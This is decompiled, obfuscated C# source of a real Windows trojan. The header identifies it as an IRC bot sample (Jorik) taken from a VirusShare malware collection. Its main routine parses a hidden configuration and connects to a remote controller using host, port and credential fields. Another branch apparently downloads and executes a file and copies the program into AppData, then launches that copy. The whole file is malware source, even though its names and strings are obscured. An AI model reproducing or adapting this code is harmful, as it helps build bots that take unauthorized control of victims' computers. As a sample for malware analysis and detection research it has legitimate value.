// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Refx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0A6501CE-651B-49EF-9CD4-6837233ABDB4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.Win32.Jorik.IRCbot.div-738c3979666da85c3c9872a05697e6bff01b107645b92c3a808be0f2a7bf41a4.exe

using \u0003;
using \u0005;
using \u007F;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace \u007F
{
  internal sealed class \u0080
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    private static \u001F \u0001;

    static \u0080()
    {
      \u0004.\u008E();
      \u0080.\u0001 = new \u001F();
    }

    [STAThread]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void \u0080()
    {
      try
      {
        string[] strArray = \u0086\u0003.\u009E(\u0088.\u000E\u0002(\u0084.\u009E(ref \u008C.\u0002), \u0080.\u0001(721)), \u0080.\u0001(734), -1, CompareMethod.Binary);
        string str1 = \u008C\u0003.\u009E\u0002(Environment.SpecialFolder.ApplicationData);
        string str2 = \u0080\u0003.\u008C\u0002(\u008C\u0003.\u009E\u0002(Environment.SpecialFolder.Recent), \u0080.\u0001(739), \u0086.\u0007\u0002(10, 0, 1), \u0080.\u0001(744));
        \u0086.\u0005\u0002(\u0080.\u0001(753));
        if (\u0018\u0002.\u0093((Array) strArray, 1) <= 4)
          return;
        if (\u008A\u0003.\u008E(\u009E\u0002.\u0001\u0002(\u001E\u0002.\u0003\u0002(\u008C.\u0002, 12)), \u0080.\u0001(770), false) == 0)
        {
          \u0086.\u0005\u0002(\u0080.\u0001(787));
          \u0083.\u009D(true);
          \u0086.\u0005\u0002(\u0080.\u0001(836));
          \u008B.\u0013\u0002();
          \u0086.\u0005\u0002(\u0080.\u0001(881));
          \u008A.\u0011\u0002();
          \u008C.\u0001 = strArray[5];
          \u0086.\u0005\u0002(\u0080.\u0001(922));
          \u0080.\u0001.\u0094(strArray[1], \u0008\u0002.\u0080(strArray[2]), strArray[3], strArray[4]);
          \u0080.\u0001.\u0095();
        }
        else
        {
          if (\u0008\u0002.\u009B(strArray[6]) > 0)
          {
            \u0086.\u0005\u0002(\u0080.\u0001(951));
            \u0082.\u009A(strArray[6], str2);
            \u0086.\u0003\u0002(str2);
          }
          \u0086.\u0005\u0002(\u0080.\u0001(984));
          \u0098\u0002.\u0018(\u008C.\u0002, \u008B\u0003.\u008A\u0002(str1, \u0080.\u0001(1021)));
          \u0086.\u0005\u0002(\u0080.\u0001(1042));
          \u0089.\u000F\u0002(\u008C.\u0003, \u008B\u0003.\u008A\u0002(str1, \u0080.\u0001(1021)), true);
          \u0086.\u0005\u0002(\u0080.\u0001(1071));
          Process process = \u0090\u0003.\u009B\u0004(\u008B\u0003.\u008A\u0002(str1, \u0080.\u0001(1021)));
          \u0086.\u0005\u0002(\u0080.\u0001(1096));
          \u0012\u0003.\u0091();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        \u0086.\u0005\u0002(\u008B\u0003.\u008A\u0002(\u0080.\u0001(1105), \u0086\u0002.\u007E\u0093\u0002((object) exception)));
        \u0012\u0003.\u0090();
      }
    }
  }
}
